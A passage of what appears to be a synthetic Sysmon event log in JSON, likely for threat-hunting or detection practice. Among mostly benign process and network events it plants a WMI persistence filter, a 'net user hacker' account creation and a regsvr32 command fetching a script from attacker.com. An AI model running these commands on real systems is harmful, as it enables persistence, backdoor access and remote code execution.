      "Hashes": "SHA256=e281677d9ddc8ab8c9bf9c59f8cf3708fb27eb5a89aac874656c9c2db6ccf6d9"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-01",
    "UtcTime": "2024-03-03T19:33:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
      "DestinationIp": "10.0.0.10",
      "DestinationPort": 445,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.202",
      "SourcePort": "59999"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-03",
    "UserName": "charlie",
    "UtcTime": "2024-03-08T05:32:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "CommandLine": "svchost.exe -k netsvcs -p -s Schedule",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\SYSTEM",
      "ProcessId": "9491",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=a66fbadb214184347e0dca789cf0d5685754e263d8a996e2cb1de7ec55be472a"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-06",
    "UserName": "svc_backup",
    "UtcTime": "2024-03-09T06:32:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\explorer.exe",
      "CommandLine": "explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\bob",
      "ProcessId": "3958",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=3f966cb1cfe4457a667b1faf6cd59ffba49a480b2f40fe0752ca7017a90f8f12"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-02",
    "UserName": "alice",
    "UtcTime": "2024-03-15T02:45:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "CommandLine": "svchost.exe -k netsvcs -p -s Schedule",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\administrator",
      "ProcessId": "3803",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=b9d40f35330ac0e9f5d111aca7d7531dcc51cc497e39272a83d7caaa4655f213"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-08",
    "UserName": "alice",
    "UtcTime": "2024-03-11T12:57:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\conhost.exe",
      "CommandLine": "conhost.exe 0xffffffff -ForceV1",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\dave",
      "ProcessId": "4957",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=59ea7dd366070265422f71dcc909907c0704b114a5cb3cd16073ec18284a8a56"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-05",
    "UserName": "alice",
    "UtcTime": "2024-03-06T20:07:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\notepad.exe",
      "CommandLine": "notepad.exe report.txt",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "2273",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=7db378c8d5cfb381f343cbc543489c36d053c34636b8f54630b45abb0580fe1d"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-01",
    "UtcTime": "2024-03-26T18:15:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Chrome\\chrome.exe",
      "DestinationIp": "10.0.0.75",
      "DestinationPort": 3389,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.175",
      "SourcePort": "55773"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-02",
    "UtcTime": "2024-03-13T12:16:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "DestinationIp": "10.0.0.199",
      "DestinationPort": 443,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.123",
      "SourcePort": "59333"
    }
  },
  {
    "EventID": 3,
    "Computer": "SERVER-02",
    "UtcTime": "2024-03-02T18:06:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "DestinationIp": "10.0.0.100",
      "DestinationPort": 445,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.217",
      "SourcePort": "55329"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-05",
    "UserName": "bob",
    "UtcTime": "2024-03-01T10:50:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
      "CommandLine": "wmic /namespace:\\\\root\\subscription PATH __EventFilter CREATE Name=Persistence,EventNamespace=root\\cimv2,QueryLanguage=WQL,Query=SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\svc_backup",
      "ProcessId": "8849",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=cf219e4d8281e7b442615fec551a99e88bb3149cfe38dda7332a155834182b23"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-03",
    "UserName": "bob",
    "UtcTime": "2024-03-09T03:10:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "CommandLine": "svchost.exe -k netsvcs -p -s Schedule",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "2988",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=5157243d31b89d643256ce509e5ba2a05ca81070dd982671db0e0a2e4e6644ab"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-08",
    "UserName": "charlie",
    "UtcTime": "2024-03-21T09:42:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\wuauclt.exe",
      "CommandLine": "wuauclt.exe /UpdateDeploymentProvider",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\administrator",
      "ProcessId": "5197",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=b57c6032a591f41f34a4d43c059f4fbd264fce598a7d932fa70c2800848a57bd"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-06",
    "UserName": "bob",
    "UtcTime": "2024-03-29T04:47:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\taskhostw.exe",
      "CommandLine": "taskhostw.exe SYSTEM",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\alice",
      "ProcessId": "7360",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=71561513359a070f26881aab6c06ab2b7f2ed3646829a15e9e0b6a9f70cef3d1"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-02",
    "UserName": "administrator",
    "UtcTime": "2024-03-29T00:23:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Chrome\\chrome.exe",
      "CommandLine": "chrome.exe --type=renderer",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\alice",
      "ProcessId": "5147",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=647aab8e807030890fb6c34a7fc9fa7fdb1a65d66350928645436bf59f6d6996"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-02",
    "UserName": "bob",
    "UtcTime": "2024-03-06T08:24:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\wuauclt.exe",
      "CommandLine": "wuauclt.exe /UpdateDeploymentProvider",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\SYSTEM",
      "ProcessId": "8639",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=be964a9b42f031aea5feb1974a32125c7a9c9d2ada7cb68ac4341ec91d1d54d4"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-01",
    "UserName": "administrator",
    "UtcTime": "2024-03-29T00:38:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\conhost.exe",
      "CommandLine": "conhost.exe 0xffffffff -ForceV1",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "5748",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=91012173f24b62c0f63a3ea6988162f6bfaf0070027786a766ff16a29e521fbf"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-04",
    "UtcTime": "2024-03-17T17:40:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\notepad.exe",
      "DestinationIp": "10.0.0.20",
      "DestinationPort": 443,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.237",
      "SourcePort": "52374"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-08",
    "UtcTime": "2024-03-20T08:32:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\conhost.exe",
      "DestinationIp": "10.0.0.44",
      "DestinationPort": 443,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.4",
      "SourcePort": "58230"
    }
  },
  {
    "EventID": 1,
    "Computer": "SERVER-02",
    "UserName": "svc_backup",
    "UtcTime": "2024-03-05T19:32:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\wuauclt.exe",
      "CommandLine": "wuauclt.exe /UpdateDeploymentProvider",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\administrator",
      "ProcessId": "4652",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=f7bfd5daef106e28bb0d26b55af43b81d3fe3ad9d02a32529cb80a2bb3be545a"
    }
  },
  {
    "EventID": 1,
    "Computer": "SERVER-02",
    "UserName": "charlie",
    "UtcTime": "2024-03-26T23:12:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\taskhostw.exe",
      "CommandLine": "taskhostw.exe SYSTEM",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\bob",
      "ProcessId": "9839",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=8600a5d634f20d377d53449f2a6ca1deeb3190436b8904ea314104c2b558cbeb"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-08",
    "UserName": "svc_backup",
    "UtcTime": "2024-03-27T06:17:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
      "CommandLine": "MsMpEng.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\SYSTEM",
      "ProcessId": "7194",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=6361814ee31899b0438fcbe77686d3694c5b31867bf2945f278effc44bb90ff8"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-01",
    "UserName": "administrator",
    "UtcTime": "2024-03-02T02:00:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Chrome\\chrome.exe",
      "CommandLine": "chrome.exe --type=renderer",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\bob",
      "ProcessId": "4904",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=ed981d307175216372f7ea34a9851ee78e2d2905cb8f034c2a50e0dc76f76bf0"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-06",
    "UserName": "administrator",
    "UtcTime": "2024-03-15T12:45:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "CommandLine": "svchost.exe -k netsvcs -p -s Schedule",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "7211",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=80357e39470d5259cf0891bde0105f7a946f930afa5d5773bf59b26ed544d967"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-01",
    "UserName": "alice",
    "UtcTime": "2024-03-04T09:45:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\wuauclt.exe",
      "CommandLine": "wuauclt.exe /UpdateDeploymentProvider",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\bob",
      "ProcessId": "8639",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=17e990b7c3e88094c0a1e25e721fdf466008b5edc8bd8132f9d7e693df892120"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-08",
    "UserName": "alice",
    "UtcTime": "2024-03-07T12:24:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "CommandLine": "svchost.exe -k netsvcs -p -s Schedule",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "5667",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=e83c5caad277a350860fa88aa94fd651b02676955d4837f3c454c7026280dbe6"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-08",
    "UtcTime": "2024-03-15T03:42:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\taskhostw.exe",
      "DestinationIp": "10.0.0.128",
      "DestinationPort": 80,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.151",
      "SourcePort": "59257"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-07",
    "UserName": "dave",
    "UtcTime": "2024-03-11T09:32:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\conhost.exe",
      "CommandLine": "conhost.exe 0xffffffff -ForceV1",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\bob",
      "ProcessId": "4759",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=44f2fffbf74f28fbbf50c87f79600f39e2d7eab4396faba6128df8798c3e898b"
    }
  },
  {
    "EventID": 1,
    "Computer": "SERVER-02",
    "UserName": "alice",
    "UtcTime": "2024-03-12T02:37:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\conhost.exe",
      "CommandLine": "conhost.exe 0xffffffff -ForceV1",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "8938",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=57d699061d5910b1121cc65b19ebd9788c9ee739ca65bdc05fefe5e5200ed952"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-04",
    "UtcTime": "2024-03-13T01:38:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Chrome\\chrome.exe",
      "DestinationIp": "10.0.0.126",
      "DestinationPort": 80,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.31",
      "SourcePort": "54834"
    }
  },
  {
    "EventID": 1,
    "Computer": "SERVER-02",
    "UserName": "bob",
    "UtcTime": "2024-03-29T03:03:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Chrome\\chrome.exe",
      "CommandLine": "chrome.exe --type=renderer",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "1581",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=a681251cfa7e215b02ce4a5e9223ca292f50c60fe7a1f2e113ee8fdb1cec9f9d"
    }
  },
  {
    "EventID": 1,
    "Computer": "DC-01",
    "UserName": "charlie",
    "UtcTime": "2024-03-29T18:34:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
      "CommandLine": "MsMpEng.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\administrator",
      "ProcessId": "1488",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=e64db42cf941897adf9bbda2d19f1dfd86358a9f9caeacb1cb61bc868751e1a4"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-07",
    "UserName": "alice",
    "UtcTime": "2024-03-01T09:16:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\net.exe",
      "CommandLine": "net user hacker P@ssw0rd! /add",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\dave",
      "ProcessId": "4988",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=b9fb7d5339d40e9c056ad27dbedbfb3ee1b2a526c039c7e2a7445b2a6049e09b"
    }
  },
  {
    "EventID": 3,
    "Computer": "DC-01",
    "UtcTime": "2024-03-13T17:03:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\wuauclt.exe",
      "DestinationIp": "10.0.0.221",
      "DestinationPort": 3389,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.167",
      "SourcePort": "60593"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-05",
    "UserName": "charlie",
    "UtcTime": "2024-03-01T11:42:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\regsvr32.exe",
      "CommandLine": "regsvr32.exe /u /s /i:http://attacker.com/payload.sct scrobj.dll",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\dave",
      "ProcessId": "2386",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=e3070e957d28a8ffed6085891c40479a9b4ff2533ba3bc747bd0a9f5aaac33cb"
    }
  },
  {
    "EventID": 1,
    "Computer": "SERVER-02",
    "UserName": "charlie",
    "UtcTime": "2024-03-02T07:10:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\notepad.exe",
      "CommandLine": "notepad.exe report.txt",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\administrator",
      "ProcessId": "8210",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=7e94e832a5db655c1f93e8eb5d76ff6803b5999250d8f8fc285f424721cffa9d"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-01",
    "UtcTime": "2024-03-03T11:39:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\notepad.exe",
      "DestinationIp": "10.0.0.90",
      "DestinationPort": 80,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.11",
      "SourcePort": "63543"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-08",
    "UserName": "SYSTEM",
    "UtcTime": "2024-03-29T09:29:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "CommandLine": "svchost.exe -k netsvcs -p -s Schedule",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\alice",
      "ProcessId": "9332",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=559c1c0dc990040bd1b61ce58b8ac943235b5beded41aa40ebca618c6d4b3993"
    }
  },
  {
    "EventID": 1,
    "Computer": "SERVER-02",
    "UserName": "charlie",
    "UtcTime": "2024-03-26T06:16:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
      "CommandLine": "MsMpEng.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "2162",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=304547c5c13731e7e14b995fccb190183a8c4a781fafd5d3c04f96c9df1a2782"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-05",
    "UserName": "alice",
    "UtcTime": "2024-03-16T08:49:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "CommandLine": "svchost.exe -k netsvcs -p -s Schedule",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\svc_backup",
      "ProcessId": "1911",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=a9ef5d077c32a1ac72ca2caa7e0d0e65ff51b066afc61e601a6f628779d91bef"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-01",
    "UserName": "charlie",
    "UtcTime": "2024-03-04T02:38:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Chrome\\chrome.exe",
      "CommandLine": "chrome.exe --type=renderer",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\SYSTEM",
      "ProcessId": "2164",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=a21faef09c5ff49eee815e0c4bd43114ba89a5811fd88656182647bc864aedb1"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-08",
    "UserName": "charlie",
    "UtcTime": "2024-03-07T07:53:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\notepad.exe",
      "CommandLine": "notepad.exe report.txt",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\SYSTEM",
      "ProcessId": "7394",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=1e7efd375d8c6493f9e78e0f76ee51e77ab5a982af56b5d298de52866715f9e7"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-07",
    "UserName": "charlie",
    "UtcTime": "2024-03-13T16:25:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\wuauclt.exe",
      "CommandLine": "wuauclt.exe /UpdateDeploymentProvider",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\svc_backup",
      "ProcessId": "4610",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=b4466375f2d2c1dc2e2938309e96da1534d74f0b49c64e8a00d64e2ad151f6ef"
    }
  },
  {
    "EventID": 1,
    "Computer": "SERVER-02",
    "UserName": "alice",
    "UtcTime": "2024-03-15T21:03:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\notepad.exe",
      "CommandLine": "notepad.exe report.txt",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "9087",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=98a588232efa860c05cdf3b1ce85b95510115b76082a31b2ae5c78d5ae5203de"
    }
  },
